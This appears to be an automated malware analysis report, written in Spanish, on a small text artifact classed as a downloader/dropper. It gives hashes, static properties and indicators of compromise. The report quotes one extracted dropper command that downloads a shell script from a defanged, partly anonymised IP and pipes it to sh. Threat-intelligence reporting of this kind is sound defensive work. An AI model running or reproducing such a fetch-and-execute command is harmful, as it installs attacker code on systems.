# 🧬 Payload Analysis

`d5b47b0187db62a7f17f3a74d8639b5b525ba6822198e2fe863c403e3a8a061e`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 320 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d5b47b0187db62a7f17f3a74d8639b5b525ba6822198e2fe863c403e3a8a061e`
- **MD5:** `0167741002bfae3c251e6cf0d2b97370`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 320 B |
| Entropía | 5.19 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxrh;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxrh;c
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | cmd=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s zyxrh;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s zyxrh;c | strings |
| hash | d5b47b0187db62a7f17f3a74d8639b5b525ba6822198e2fe863c403e3a8a061e | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
